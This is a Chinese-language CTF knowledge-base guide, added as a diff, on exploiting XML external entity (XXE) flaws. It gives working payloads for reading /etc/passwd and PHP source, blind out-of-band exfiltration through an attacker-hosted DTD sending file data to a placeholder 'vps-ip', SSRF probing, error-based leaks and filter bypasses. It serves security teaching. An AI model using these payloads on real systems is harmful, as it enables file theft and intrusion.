@@ -1,0 +1,72 @@
+XXE 漏洞 CTF 解题思路全指南 (Knowledge Base)
+一、 漏洞核心原理
+XXE 发生于应用程序解析 XML 输入时，没有禁止外部实体的加载，导致攻击者可以加载恶意外部文件。
+    关键点：<!ENTITY> 声明。
+    危害：任意文件读取、内网探测 (SSRF)、命令执行 (需特定环境)、拒绝服务 (Billion Laughs Attack)。
+
+二、 漏洞探测 (Detection)
+在 CTF 中，首先要确认是否存在 XML 解析点：
+    直接观察：请求体中明显包含 XML 格式数据。
+    修改 Content-Type：尝试将 Content-Type: application/json 改为 application/xml，并手工构造 XML Payload。
+    SVG/Office 文件：上传点如果支持 SVG 图片或 Excel/Word 文档，这些文件本质是 XML，可能存在 XXE。
+
+三、 常见攻击 Payload
+1. 基础文件读取 (已知回显)
+这是最简单的场景，直接定义实体并在文档中引用。
+XML
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+  <user>&xxe;</user>
+</root>
+
+2. PHP 环境下的 Base64 编码读取
+如果读取的内容包含 <、& 等字符（如 PHP 源码），直接读取会破坏 XML 结构导致报错。此时利用 PHP 伪协议。
+XML
+<!DOCTYPE test [
+  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
+]>
+
+3. Blind XXE (无回显)
+当页面不返回解析结果时，需要通过 带外传输 (OOB) 获取数据。
+步骤：
+    攻击者 VPS 准备 test.dtd：
+    XML
+    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+    <!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://vps-ip:port/?data=%file;'>">
+
+    发送 Payload 触发：
+    XML
+    <!DOCTYPE test [
+      <!ENTITY % remote SYSTEM "http://vps-ip/test.dtd">
+      %remote;
+      %int;
+      %send;
+    ]>
+
+四、 CTF 高级进阶技巧
+1. 内网探测 (SSRF)
+利用 http:// 协议探测内网端口或访问内网服务。
+XML
+<!ENTITY ssrf SYSTEM "http://172.16.1.1:8080/admin">
+
+2. 利用报错回显数据 (Error-based)
+在没有 OOB 环境（无法出网）且没有直接回显时，可以尝试让服务器在报错信息中带出文件内容。
+XML
+<!DOCTYPE root [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % remote SYSTEM "http://vps-ip/error.dtd">
+    %remote;
+]>
+
+error.dtd 内容示例：
+XML
+<!ENTITY % dummy "<!ENTITY &#37; error SYSTEM 'file:///nonexistent/%file;'>">
+%dummy;
+
+3. 绕过 WAF/过滤器
+    编码绕过：尝试使用 UTF-16BE 或其他编码。
+    利用协议：如果 file:// 被封禁，尝试 netdoc:///etc/passwd (Java) 或 data://。
+    实体嵌套：通过参数实体多次引用绕过关键词过滤。
